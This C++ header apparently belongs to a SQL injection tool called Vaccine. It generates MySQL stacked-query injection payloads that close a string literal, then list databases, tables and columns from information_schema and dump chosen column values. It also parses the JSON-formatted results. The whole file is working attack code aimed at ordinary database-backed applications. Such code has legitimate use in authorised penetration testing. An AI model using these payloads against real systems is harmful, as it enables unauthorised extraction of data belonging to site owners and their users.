#ifndef MYSQL_STACKED_QUERIES
#define MYSQL_STACKED_QUERIES

#define STACKED_QUERIES_DATABASE 0
#define STACKED_QUERIES_TABLE 1
#define STACKED_QUERIES_COLUMN 2

#include "../../Vaccine.hpp"

struct mysql_stacked_queries
{
        static std::string payload(sptr_vector& config, const uint8& type)
        {
                switch (type)
                {
                case DATABASES:
                        return "'; SELECT schema_name "
                               "FROM information_schema.schemata-- ";
                case TABLES:
                        return "'; SELECT table_name "
                               "FROM information_schema.tables "
                               "WHERE table_schema = '" +
                               *config[STACKED_QUERIES_DATABASE] + "'-- ";
                case COLUMNS:
                        return "'; SELECT column_name "
                               "FROM information_schema.columns "
                               "WHERE table_schema = '" +
                               *config[STACKED_QUERIES_DATABASE] + "' " +
                               "AND table_name = '" +
                               *config[STACKED_QUERIES_TABLE] + "'-- ";
                case VALUES:
                        return "'; SELECT " + *config[STACKED_QUERIES_COLUMN] + " " +
                               "FROM " + *config[STACKED_QUERIES_DATABASE] + "." +
                               *config[STACKED_QUERIES_TABLE] + "-- ";
                default:
                        return std::string();
                }
        };

        static str_vector parser(
            const Json::Value& entries,
            const Json::String& member)
        {
                str_vector values;
                for (const auto& array : entries[member])
                {
                        if (!(array.isArray() && !array.empty()))
                                continue;
                        for (const auto& entry : array)
                        {
                                for (const auto& key : entry.getMemberNames())
                                {
                                        if (entry[key].isNull())
                                                continue;
                                        std::string entry_str;
                                        try
                                        {
                                                entry_str = entry[key].asString();
                                        }
                                        catch (const std::exception& e)
                                        {
                                                entry_str = "NOT_CONVERTIBLE";
                                        }
                                        values.push_back(entry_str);
                                        break;
                                }
                        }
                        return values;
                }
                return values;
        };
};
#endif